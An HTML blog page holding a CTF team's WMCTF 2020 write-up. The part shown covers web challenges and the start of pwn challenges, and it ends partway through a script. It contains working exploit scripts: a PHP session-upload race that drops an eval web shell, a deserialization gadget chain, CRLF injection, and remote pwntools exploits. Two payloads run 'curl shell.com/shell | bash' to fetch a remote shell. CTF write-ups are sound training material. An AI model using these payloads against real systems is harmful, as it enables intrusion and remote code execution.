<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>WMCTF 2020 SU Write-Up - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 WMCTF 2020 的 writeup。"><meta property="og:type" content="blog"><meta property="og:title" content="WMCTF 2020 SU Write-Up"><meta property="og:url" content="https://team-su.github.io/posts/50874.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 WMCTF 2020 的 writeup。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_6c61a5a08c92dbda0b82e77a9ffb0afb.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_f40cca716ad4cccb72861350a9b79c3e.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_b3e744e636152849dc783d0ff598e507.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_0280daf918a26ff67cafd0d76c9745e5.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_5db1d582c9cd1710e90fd9de5e605019.png"><meta property="og:image" content="https://images-cdn.shimo.im/V0etRC2WJpTzNdys__thumbnail.PNG"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_44b8b47e88c65b64871b31003e28c45e.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_66fa2c8058debf0be49712ab229dc1ad.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_36ef3f2933fd61a8f638cbfa7bb0197a.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_238ca188ca474387ad33958b4cbff3be.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_0d910504a7ecb5dfa598b63708415bb9.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_eb1e6150524146d82f47f963b35c4a87.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_adfc7becae87af10ef6798f13fe703ee.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_933b2c51cb597137690981f9004ce0d5.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_b0b0102d285e2209705ad6e60fcbf3dd.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_aa549cd4b2fea446ef3cede72d45f0ca.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_8cdadd80b40e712d8885735244da2871.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_4e390411a80f80ec29f9859d80ff4d67.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_f4ea85e2037390a2008bdb99f9973dd6.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_faf549fca1bd7700eaead38dfb8281f4.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_c126a80567a8eeab248c3b0ff26319cd.png"><meta property="article:published_time" content="2020-08-04T13:35:50.000Z"><meta property="article:modified_time" content="2025-07-13T10:34:37.200Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="WMCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://hackmd.summershrimp.com/uploads/upload_6c61a5a08c92dbda0b82e77a9ffb0afb.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/50874.html"},"headline":"WMCTF 2020 SU Write-Up","image":["https://hackmd.summershrimp.com/uploads/upload_6c61a5a08c92dbda0b82e77a9ffb0afb.png","https://hackmd.summershrimp.com/uploads/upload_f40cca716ad4cccb72861350a9b79c3e.png","https://hackmd.summershrimp.com/uploads/upload_b3e744e636152849dc783d0ff598e507.png","https://hackmd.summershrimp.com/uploads/upload_0280daf918a26ff67cafd0d76c9745e5.png","https://hackmd.summershrimp.com/uploads/upload_5db1d582c9cd1710e90fd9de5e605019.png","https://hackmd.summershrimp.com/uploads/upload_44b8b47e88c65b64871b31003e28c45e.png","https://hackmd.summershrimp.com/uploads/upload_66fa2c8058debf0be49712ab229dc1ad.png","https://hackmd.summershrimp.com/uploads/upload_36ef3f2933fd61a8f638cbfa7bb0197a.png","https://hackmd.summershrimp.com/uploads/upload_238ca188ca474387ad33958b4cbff3be.png","https://hackmd.summershrimp.com/uploads/upload_0d910504a7ecb5dfa598b63708415bb9.png","https://hackmd.summershrimp.com/uploads/upload_eb1e6150524146d82f47f963b35c4a87.png","https://hackmd.summershrimp.com/uploads/upload_adfc7becae87af10ef6798f13fe703ee.png","https://hackmd.summershrimp.com/uploads/upload_933b2c51cb597137690981f9004ce0d5.png","https://hackmd.summershrimp.com/uploads/upload_b0b0102d285e2209705ad6e60fcbf3dd.png","https://hackmd.summershrimp.com/uploads/upload_aa549cd4b2fea446ef3cede72d45f0ca.png","https://hackmd.summershrimp.com/uploads/upload_8cdadd80b40e712d8885735244da2871.png","https://hackmd.summershrimp.com/uploads/upload_4e390411a80f80ec29f9859d80ff4d67.png","https://hackmd.summershrimp.com/uploads/upload_f4ea85e2037390a2008bdb99f9973dd6.png","https://hackmd.summershrimp.com/uploads/upload_faf549fca1bd7700eaead38dfb8281f4.png","https://hackmd.summershrimp.com/uploads/upload_c126a80567a8eeab248c3b0ff26319cd.png"],"datePublished":"2020-08-04T13:35:50.000Z","dateModified":"2025-07-13T10:34:37.200Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 WMCTF 2020 的 writeup。"}</script><link rel="canonical" href="https://team-su.github.io/posts/50874.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-08-04T13:35:50.000Z" title="2020/8/4 21:35:50">2020-08-04</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T10:34:37.200Z" title="2025/7/13 18:34:37">2025-07-13</time></span><span class="level-item">an hour read (About 6854 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">WMCTF 2020 SU Write-Up</h1><div class="content"><p>感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#115;&#117;&#101;&#x72;&#115;&#95;&#x78;&#99;&#116;&#102;&#x40;&#49;&#x32;&#54;&#x2e;&#x63;&#111;&#x6d;">suers_xctf@126.com</a></p>
<p>以下是我们 SU 本次 WMCTF 2020 的 writeup。</p>
<span id="more"></span>

<hr>
<p>感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#x75;&#x65;&#114;&#x73;&#x5f;&#120;&#x63;&#116;&#102;&#64;&#x31;&#x32;&#54;&#x2e;&#99;&#111;&#109;">suers_xctf@126.com</a></p>
<p>以下是我们 SU 本次 WMCTF 2020 的 writeup。</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#web-checkin">web_checkin</a></li>
<li><a href="#make-php-great-again">Make PHP Great Again</a></li>
<li><a href="#make-php-great-again-and-again">Make PHP Great Again And Again</a></li>
<li><a href="#webweb">webweb</a></li>
<li><a href="#gogogo">gogogo</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#mengyedekending">mengyedekending</a></li>
<li><a href="#csgo">csgo</a></li>
<li><a href="#roshambo">roshambo</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#dalabengba">Dalabengba</a></li>
<li><a href="#xman-happy-birthday">XMAN_Happy_birthday!</a></li>
<li><a href="#music-game">Music_game</a></li>
</ul>
</li>
<li><a href="#rev">Rev</a><ul>
<li><a href="#wmware">Wmware</a></li>
<li><a href="#welcome-to-ctf">Welcome to CTF</a></li>
<li><a href="#easy-re">easy_re</a></li>
<li><a href="#meet-in-july">Meet_in_July</a></li>
<li><a href="#easy-apk">easy_apk</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#babysum">babySum</a></li>
<li><a href="#piece-of-cake">piece_of_cake</a></li>
<li><a href="#game">Game</a></li>
<li><a href="#idiot-box">idiot box</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h2><span id="web">Web</span><a href="#web" class="header-anchor"></a></h2><h3><span id="web-checkin">web_checkin</span><a href="#web-checkin" class="header-anchor"></a></h3><p><strong>Third Blood</strong></p>
<p><a href="http://web_checkin.wmctf.wetolink.com/?content=/flag">http://web_checkin.wmctf.wetolink.com&#x2F;?content&#x3D;&#x2F;flag</a></p>
<h3><span id="make-php-great-again">Make PHP Great Again</span><a href="#make-php-great-again" class="header-anchor"></a></h3><p>session 包含</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"> event = threading.Event()</span><br><span class="line"> <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">       threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">       threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"> event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
<h3><span id="make-php-great-again-and-again">Make PHP Great Again And Again</span><a href="#make-php-great-again-and-again" class="header-anchor"></a></h3><p><strong>Second Blood</strong></p>
<p>因为 require_once 读不了 flag.php, 根据上一题 flag 的提示是 php 自己的问题, 找了半天发现<br><a href="https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c">https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c</a></p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_6c61a5a08c92dbda0b82e77a9ffb0afb.png"></p>
<p>超过 32 层会停止读符号链接, 所以用 &#x2F;proc&#x2F;self&#x2F;root 套 33 层娃即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://v2222.no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=compress.zlib://file:///proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
<h3><span id="webweb">webweb</span><a href="#webweb" class="header-anchor"></a></h3><p>反序列化 gadgets 挖掘, 没啥好说的, 需要注意下清空一些类的构造函数, 不然东西太多会 413</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lib/cli/ws.php __destruct 入口, fuction 任意, 参数不可控, 是一个对象</span><br><span class="line">lib/db/mongo/mapper.php $this-&gt;collection-&gt;insertone($this-&gt;document); 参数可控</span><br><span class="line">lib/db/sql/mapper.php __call 替换 call 的 function, insertone-&gt;任意 function, 到这里可以用任意参数 call 任意单参数函数</span><br><span class="line">lib/web.php send 读文件 或者 lib/base.php clear RCE</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$f3 = require(&#x27;lib/base.php&#x27;);</span><br><span class="line"></span><br><span class="line">$ws = new \CLI\WS(&quot;0.0.0.0&quot;); //让 base autoload 函数加载 /lib/ws.php, 之后才能用 agent 类, 所以要套一层 ws</span><br><span class="line">$agent = new \CLI\Agent();</span><br><span class="line">$ws-&gt;a = $agent;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sqlMapper = new \DB\SQL\Mapper();</span><br><span class="line">$sqlMapper-&gt;setProps(array(&quot;insertone&quot; =&gt; [new Base(), &quot;clear&quot;]));</span><br><span class="line"></span><br><span class="line">$mongoMapper = new \DB\Mongo\Mapper();</span><br><span class="line">$mongoMapper-&gt;setDocument(&quot;\$\n);system(&#x27;bash -c \&quot;curl shell.com/shell | bash\&quot;&#x27;);//&quot;);</span><br><span class="line">$mongoMapper-&gt;setCollenciton($sqlMapper);</span><br><span class="line"></span><br><span class="line">$event = array(&quot;disconnect&quot; =&gt; [$mongoMapper, &quot;insert&quot;]);</span><br><span class="line">$server = new \DB\Mongo();</span><br><span class="line"></span><br><span class="line">$server-&gt;events = $event;</span><br><span class="line">$agent-&gt;setServer($server);</span><br><span class="line"></span><br><span class="line">$dump = serialize($ws);</span><br><span class="line">system(&#x27;curl http://webweb.wmctf.wetolink.com/?a=&#x27; . urlencode($dump));</span><br></pre></td></tr></table></figure>

<h3><span id="gogogo">gogogo</span><a href="#gogogo" class="header-anchor"></a></h3><p><strong>First Blood</strong></p>
<p>三个点, math&#x2F;rand 是伪随机, 而且不播种的话结果都是一样的, 本地用同样环境搭一个就可以拿到 admin session</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MTU5NjM2NzAwNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182OYB7Y3m7o504Bjnh5dnTgHrQ8H5hNSyzaYxDB0R0Po=</span><br></pre></td></tr></table></figure>

<p>然后老版本 go 能 crlf, <a href="https://github.com/golang/go/issues/30794">https://github.com/golang/go/issues/30794</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">for i in range(97, 122):</span><br><span class="line">    print(chr(i))</span><br><span class="line"></span><br><span class="line">crlf = open(&#x27;/tmp/7&#x27;, &#x27;rb&#x27;).read().decode()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;fn&#x27;: &#x27;Req&#x27;,</span><br><span class="line">    &#x27;arg&#x27;: &quot;http://127.0.0.1/auth/login?a= HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n&quot; + crlf + &#x27;\r\n\r\n&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.headers[&#x27;Cookie&#x27;] = &#x27;o=MTU5NjM2NzAwNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182OYB7Y3m7o504Bjnh5dnTgHrQ8H5hNSyzaYxDB0R0Po=&#x27;</span><br><span class="line"></span><br><span class="line">res = sess.post(&#x27;http://gogogo.wmctf.wetolink.com/admin/invoke&#x27;, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<p>最后 plugin 必须和编译主程序同一个版本才能被加载, 试了半天发现读 &#x2F;proc&#x2F;self&#x2F;environ 可以读到是 1.9.7<br>之后编译一个传上去等应用重启就能 rce 了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func Read(input string) ([]byte, error)  &#123;</span><br><span class="line">    fmt.Printf(input)</span><br><span class="line">    cmd := exec.Command(&quot;bash&quot;, &quot;-c&quot;, &quot;curl shell.com/shell | bash&quot;)</span><br><span class="line">    cmd.Run()</span><br><span class="line">    return []byte&#123;&#125;, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h2><h3><span id="mengyedekending">mengyedekending</span><a href="#mengyedekending" class="header-anchor"></a></h3><p>C# PWN</p>
<p>玄学啊，讲道理偏移指定为220是可以覆盖到num来触发后门的，但是我输入220之后偏移被赋值成了50？</p>
<p>没事了，\r可以无限地向后推index，推到num写个0就ok了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;111.73.46.229&quot;</span>,<span class="number">51000</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;repeat?\r\n&quot;</span>,<span class="string">&quot;\r&quot;</span>*<span class="number">108</span>+<span class="string">&quot;\0&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;input?\r\n&quot;</span>,<span class="string">&quot;y&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;!\r\n&quot;</span>,<span class="built_in">str</span>(<span class="number">220</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3><span id="csgo">csgo</span><a href="#csgo" class="header-anchor"></a></h3><p>过了100关之后发现一个栈溢出，本地调试通过覆盖栈上的参数泄露pie地址，部分覆盖返回地址跳回backdoor（这里要爆破1&#x2F;16）。然后泄露链式栈地址用于定位<code>/bin/sh</code>参数，最后ROP获得shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.aslr = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;81.68.174.63&#x27;</span>,<span class="number">62176</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getline</span>():</span><br><span class="line">	a = r.recvline()</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">s,l</span>):</span><br><span class="line">	b = []</span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> i &lt; l - <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">if</span> s[i] == <span class="string">&#x27;\xe2&#x27;</span>:</span><br><span class="line">			<span class="keyword">if</span> s[i + <span class="number">2</span>] == <span class="string">&#x27;\x9b&#x27;</span>:</span><br><span class="line">				b.append(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				b.append(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">			i = i + <span class="number">3</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">if</span> s[i + <span class="number">3</span>] == <span class="string">&#x27;\xa9&#x27;</span> <span class="keyword">and</span> s[i + <span class="number">2</span>] == <span class="string">&#x27;\x9a&#x27;</span>:</span><br><span class="line">				b.append(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				b.append(<span 